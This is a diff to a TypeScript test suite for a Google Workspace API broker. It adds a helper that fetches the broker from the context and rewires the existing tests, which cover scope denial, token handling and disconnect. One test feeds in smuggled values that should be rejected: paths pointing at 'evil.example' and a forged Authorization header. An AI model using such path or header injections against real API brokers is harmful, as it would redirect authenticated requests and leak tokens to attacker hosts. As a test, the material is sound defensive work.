@@ -25,6 +25,12 @@ const SCOPES = [
   'https://www.googleapis.com/auth/contacts',
 ] as const
 
+function googleApi(ctx: Context): GoogleApiBroker {
+  const service = ctx.get('googleApi')
+  if (!(service instanceof GoogleApiBroker)) throw new Error('Google API broker is not mounted')
+  return service
+}
+
 function surface() {
   const notices: Array<{ message: string; url?: string }> = []
   return {
@@ -137,7 +143,7 @@ describe('Google Workspace OAuth authorization boundary', () => {
     await expect(ctx.authorization.begin({ key: GOOGLE_ACCOUNT_KEY, interaction: surface().interaction }))
       .resolves.toEqual({ status: 'authorized' })
 
-    await expect(ctx.googleApi.request({ service: 'drive', path: 'files' }))
+    await expect(googleApi(ctx).request({ service: 'drive', path: 'files' }))
       .rejects.toMatchObject({ code: 'GOOGLE_SCOPE_DENIED' })
   })
 
@@ -182,7 +188,7 @@ describe('Google Workspace API broker', () => {
     }) as typeof fetch
 
     await ctx.authorization.begin({ key: GOOGLE_ACCOUNT_KEY, interaction: surface().interaction })
-    const result = await ctx.googleApi.request({
+    const result = await googleApi(ctx).request({
       service: 'gmail',
       path: 'users/me/messages?maxResults=1',
     })
@@ -218,7 +224,7 @@ describe('Google Workspace API broker', () => {
       return new Response('{}', { status: 200, headers: { 'content-type': 'application/json' } })
     }) as typeof fetch
 
-    await expect(ctx.googleApi.request({ service: 'calendar', path: 'calendars/primary/events' }))
+    await expect(googleApi(ctx).request({ service: 'calendar', path: 'calendars/primary/events' }))
       .resolves.toMatchObject({ status: 200, ok: true })
     expect(authorization).toBe('Bearer restored-access-token')
   })
@@ -252,7 +258,7 @@ describe('Google Workspace API broker', () => {
       return new Response('{}', { status: 200 })
     }) as typeof fetch
 
-    await ctx.googleApi.request({ service: 'drive', path: 'files?pageSize=1' })
+    await googleApi(ctx).request({ service: 'drive', path: 'files?pageSize=1' })
 
     expect(modifySpy).toHaveBeenCalledWith(GOOGLE_ACCOUNT_KEY, expect.any(Function))
     const stored = JSON.stringify(await ctx.credentials.readRecord(GOOGLE_ACCOUNT_KEY))
@@ -266,14 +272,14 @@ describe('Google Workspace API broker', () => {
     internals.now = () => 1_000_000
     await authorize(ctx)
 
-    await expect(ctx.googleApi.request({ service: 'gmail', path: '//evil.example/steal' }))
+    await expect(googleApi(ctx).request({ service: 'gmail', path: '//evil.example/steal' }))
       .rejects.toMatchObject({ code: 'GOOGLE_PATH_DENIED' })
-    await expect(ctx.googleApi.request({
+    await expect(googleApi(ctx).request({
       service: 'drive',
       path: 'files',
       headers: { Authorization: 'Bearer model-supplied-token' },
     })).rejects.toMatchObject({ code: 'GOOGLE_HEADER_DENIED' })
-    await expect(ctx.googleApi.request({ service: 'calendar', path: 'https://evil.example/' }))
+    await expect(googleApi(ctx).request({ service: 'calendar', path: 'https://evil.example/' }))
       .rejects.toMatchObject({ code: 'GOOGLE_PATH_DENIED' })
   })
 
@@ -283,9 +289,9 @@ describe('Google Workspace API broker', () => {
     await authorize(ctx)
     internals.fetch = (async () => { throw new Error('provider unavailable') }) as typeof fetch
 
-    await expect(ctx.googleApi.disconnect()).resolves.toEqual({ revoked: false })
+    await expect(googleApi(ctx).disconnect()).resolves.toEqual({ revoked: false })
     expect(await ctx.credentials.readRecord(GOOGLE_ACCOUNT_KEY)).toBeUndefined()
-    await expect(ctx.googleApi.request({ service: 'gmail', path: 'users/me/messages' }))
+    await expect(googleApi(ctx).request({ service: 'gmail', path: 'users/me/messages' }))
       .rejects.toMatchObject({ code: 'GOOGLE_REAUTH_REQUIRED' })
   })
 })
